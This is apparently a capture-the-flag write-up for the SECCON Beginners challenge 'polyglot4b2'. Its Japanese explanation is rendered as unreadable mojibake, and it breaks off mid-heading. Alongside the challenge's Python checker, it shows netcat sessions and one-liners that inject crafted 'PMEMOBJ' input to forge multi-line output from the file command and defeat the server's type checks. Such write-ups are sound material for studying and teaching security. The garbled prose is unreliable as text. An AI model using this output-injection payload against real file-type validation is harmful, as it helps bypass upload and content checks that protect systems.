# polyglot4b2

## å•é¡Œæ–‡
ã‚ˆã‚Šç¾Žã—ã„polyglotã‚’ä½œã‚Œã‚‹ã‚¨ãƒ‡ã‚£ã‚¿ã‚’é–‹ç™ºã—ãŸã‚ˆï¼ ã‚„ã£ã±ã‚Špolyglotã¯ç°¡å˜ã«ä½œã‚Œã‚‹ï¼Ÿ  
`nc polyglot4b2.beginners.seccon.games 31417`  
[polyglot4b2.tar.gz](files/polyglot4b2.tar.gz) 3ef2f2521482f5845eb03638fa4cc7e7130ecd41  

## é›£æ˜“åº¦
**medium**  

## ä½œå•ã«ã‚ãŸã£ã¦
polyglot4bã‚’pwnyaaã•ã‚“ã¨æã­ã¦ã„ãŸã‚‰ã€é›£ã—ããªã£ãŸã®ã§å‡ºé¡Œã—ã¾ã—ãŸã€‚  
è‹¥å¹²ã®ãƒŸã‚¹ãƒªãƒ¼ãƒ‰ãŒå…¥ã£ã¦ãŠã‚Šã€æ„åœ°æ‚ªãªmediumå•é¡Œã¨ãªã£ã¦ã„ã¾ã™ã€‚  
å®Ÿã¯ã‚¯ã‚ªãƒªãƒ†ã‚£ã«æº€è¶³ã—ã¦ãŠã‚‰ãšã€å‰æ—¥ã¾ã§å‡ºã™ã‹è¿·ã£ã¦ã„ã¾ã—ãŸã€‚  

## è§£æ³•
[polyglot4b](../polyglot4b)ã®ç¶šãå•é¡Œã®ã‚ˆã†ã ã€‚  
æŽ¥ç¶šã™ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ã«ä¸­èº«ãŒå°‘ã—å¤‰ã‚ã£ã¦ã„ã‚‹ã€‚  
```bash
$ nc polyglot4b2.beginners.seccon.games 31417
 ____       _             _       _     _____    _ _ _               ____
|  _ \ ___ | |_   _  __ _| | ___ | |_  | ____|__| (_) |_ ___  _ __  |___ \
| |_) / _ \| | | | |/ _` | |/ _ \| __| |  _| / _` | | __/ _ \| '__|   __) |
|  __/ (_) | | |_| | (_| | | (_) | |_  | |__| (_| | | || (_) | |     / __/
|_|   \___/|_|\__, |\__, |_|\___/ \__| |_____\__,_|_|\__\___/|_|    |_____|
              |___/ |___/
----------------------------------------------------------------------------
>> s
ERROR: Hi, Hacker.
$ nc polyglot4b2.beginners.seccon.games 31417
 ____       _             _       _     _____    _ _ _               ____
|  _ \ ___ | |_   _  __ _| | ___ | |_  | ____|__| (_) |_ ___  _ __  |___ \
| |_) / _ \| | | | |/ _` | |/ _ \| __| |  _| / _` | | __/ _ \| '__|   __) |
|  __/ (_) | | |_| | (_| | | (_) | |_  | |__| (_| | | || (_) | |     / __/
|_|   \___/|_|\__, |\__, |_|\___/ \__| |_____\__,_|_|\__\___/|_|    |_____|
              |___/ |___/
----------------------------------------------------------------------------
>> S
S
~~
S
----------------------------------------------------------------------------
ERROR: You are not a beginner.
| JPG: ðŸŸ¥ | PNG: ðŸŸ¥ | GIF: ðŸŸ¥ | PDF: ðŸŸ¥ | ELF: ðŸŸ¥ | TXT: ðŸŸ¥ |
FLAG: No! File koime!!
```
ã‚¢ãƒ«ãƒ•ã‚¡ãƒ™ãƒƒãƒˆå¤§æ–‡å­—ã—ã‹å—ã‘ä»˜ã‘ãªã„ã‚ˆã†ã§ã€ãƒ•ã‚¡ã‚¤ãƒ«ã®ç¨®é¡žã‚‚PDFã€ELFãŒè¿½åŠ ã•ã‚Œã¦ã„ã‚‹ã€‚  
ã‚½ãƒ¼ã‚¹ã¯ä¸»ã«ä»¥ä¸‹ã®å€‹æ‰€ãŒå¤‰æ›´ã•ã‚Œã¦ã„ãŸã€‚  
```python
~~~
file = ""
for _ in range(10):
    text = sys.stdin.buffer.readline().decode()
    if not re.fullmatch("[A-Z]+", text.replace("\n", "")):
        print("ERROR: Hi, Hacker.")
        sys.exit(0)
    if "QUIT" in text:
        break
    file += text
~~~
# You are a beginner!!!!
_4bflag = True
if "4b" not in f_type:
    print("ERROR: You are not a beginner.")
    _4bflag = False
~~~
f_type = f_type.split("\n")
try:
    if "JPEG" in f_type[0]:
        types["JPG"] = True
    if "PNG" in f_type[1]:
        types["PNG"] = True
    if "GIF" in f_type[2]:
        types["GIF"] = True
    if "PDF" in f_type[3]:
        types["PDF"] = True
    if "ELF" in f_type[4]:
        types["ELF"] = True
    if "ASCII" in f_type[5]:
        types["TXT"] = True
except:
    pass
~~~
if _4bflag and all(types.values()):
    print("FLAG: ctf4b{****REDACTED****}")
else:
    print("FLAG: No! File koime!!")
```
ä»Šå›žã¯æ–‡å­—åˆ—`4b`ãŒfileã‚³ãƒžãƒ³ãƒ‰ã®çµæžœã«å«ã¾ã‚Œã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã€ã•ã‚‰ã«ãƒ•ã‚¡ã‚¤ãƒ«ã®ç¨®é¡žãƒã‚§ãƒƒã‚¯ãŒä¸€è¡Œãšã¤ã¨ãªã£ã¦ã„ã‚‹ã€‚  
polyglot4bã®è§£æ³•ã¯ã€å‡ºåŠ›ãŒä¸€è¡Œã¨ãªã£ã¦ã—ã¾ã†ã®ã§åˆ©ç”¨ã§ããªã„ã€‚  
ã¾ãšåˆã‚ã«ã€fileã‚³ãƒžãƒ³ãƒ‰ã®å‡ºåŠ›ã‚’è¤‡æ•°è¡Œã«ã§ãã‚‹æ‰‹æ³•ã‚’æŽ¢ã™ã€‚  
fileã‚³ãƒžãƒ³ãƒ‰ã¯[ã“ã“](https://github.com/file/file/tree/master/magic/Magdir)ã§ãƒ•ã‚¡ã‚¤ãƒ«ã®ç¨®é¡žã‚’åˆ¤å®šã—ã¦ãŠã‚Šã€å‡ºåŠ›ã‚‚æ›¸ã‹ã‚Œã¦ã„ã‚‹ã€‚  
é›‘ã«`%s`ã¨ã™ã‚‹ã¨æ”¹è¡Œã‚’å«ã‚ã‚‹ã“ã¨ãŒã§ããªã„ç¨®é¡žã‚‚ãƒ’ãƒƒãƒˆã™ã‚‹ãŸã‚ã€`'%s'`ã§ä»¥ä¸‹ã®ã‚ˆã†ã«æ¤œç´¢ã™ã‚‹ã€‚  
```bash
$ grep -rl "'%s'"
aes
att3b
cisco
database
digital
elf
filesystems
freebsd
gnu
hp
icc
images
linux
maple
msdos
netbsd
olf
os2
pmem
sgi
sinclair
sun
ti-8x
varied.out
windows
zfs
```
ã“ã®ä¸­ã‹ã‚‰ãƒžã‚¸ãƒƒã‚¯ãƒŠãƒ³ãƒãƒ¼ãŒã‚¢ãƒ«ãƒ•ã‚¡ãƒ™ãƒƒãƒˆå¤§æ–‡å­—ã®ã¿ã§ã‚ã‚‹ã‚‚ã®ã‚’èª¿æŸ»ã™ã‚‹ã¨`pmem`ãŒãƒ’ãƒƒãƒˆã™ã‚‹(ãŠãã‚‰ãã“ã‚Œã ã‘)ã€‚  
ä¸­èº«ã‚’ã¿ã‚‹ã¨å‡ºåŠ›ã®æ§‹æˆãŒæ›¸ã‹ã‚Œã¦ã„ã‚‹ãŸã‚ã€ã“ã¡ã‚‰ã‚’åˆ©ç”¨ã—ã¦ä¸€è¡Œãšã¤ãƒ•ã‚¡ã‚¤ãƒ«å½¢å¼ã®ãƒã‚§ãƒƒã‚¯ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã€‚  
`pmem`ã§ã¯æ–‡å­—åˆ—`PMEMOBJ`ã®å¾Œã«4089æ–‡å­—è¿½åŠ ã™ã‚‹ã¨ã€ãã®å¾Œã®æ–‡å­—ãŒfileã‚³ãƒžãƒ³ãƒ‰ã®çµæžœã«æ”¹è¡Œè¾¼ã¿ã§è¡¨ç¤ºã•ã‚Œã‚‹ã€‚  
ä»¥ä¸‹ã®ã‚ˆã†ã«è¡Œã†ã€‚  
```bash
$ python3 -c 'print("PMEMOBJ"+"S"*4089+"JPEG\nPNG\nGIF\nPDF\nELF\nASCII\nQUIT")' | nc polyglot4b2.beginners.seccon.games 31417
 ____       _             _       _     _____    _ _ _               ____
|  _ \ ___ | |_   _  __ _| | ___ | |_  | ____|__| (_) |_ ___  _ __  |___ \
| |_) / _ \| | | | |/ _` | |/ _ \| __| |  _| / _` | | __/ _ \| '__|   __) |
|  __/ (_) | | |_| | (_| | | (_) | |_  | |__| (_| | | || (_) | |     / __/
|_|   \___/|_|\__, |\__, |_|\___/ \__| |_____\__,_|_|\__\___/|_|    |_____|
              |___/ |___/
----------------------------------------------------------------------------
>> ----------------------------------------------------------------------------
ERROR: You are not a beginner.
| JPG: ðŸŸ© | PNG: ðŸŸ© | GIF: ðŸŸ© | PDF: ðŸŸ© | ELF: ðŸŸ© | TXT: ðŸŸ© |
FLAG: No! File koime!!
```

python3 -c 'print("PMEMOBJSTK"+"CTF"*1362+"JPEG\nPNG\nGIF\nPDF\nELF\nASCII\nQUIT")' | nc localhost 31417

## ctf4